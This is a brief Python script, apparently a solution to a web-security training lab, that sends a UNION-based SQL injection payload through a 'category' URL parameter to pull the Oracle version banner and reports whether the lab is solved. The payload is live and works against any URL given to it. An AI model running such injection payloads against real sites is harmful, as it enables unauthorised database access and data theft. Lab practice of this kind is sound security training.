#!/usr/bin/env python3
# https://github.com/wvverez
# SQL injection attack, querying the database type and version on Oracle

import requests, sys
if len(sys.argv) != 2: print(f"Uso: {sys.argv[0]} (url)"); sys.exit(1)
url = sys.argv[1]
full_url = f"{url}/filter?category=Pets'+UNION+SELECT+BANNER,+NULL+FROM+v$version--"
r = requests.get(full_url)
if "Oracle Database 11g" in r.text:
    print(">>> [+] Pwned! Lab solved")
else:
    print(">>> [-] Lab not solved yet")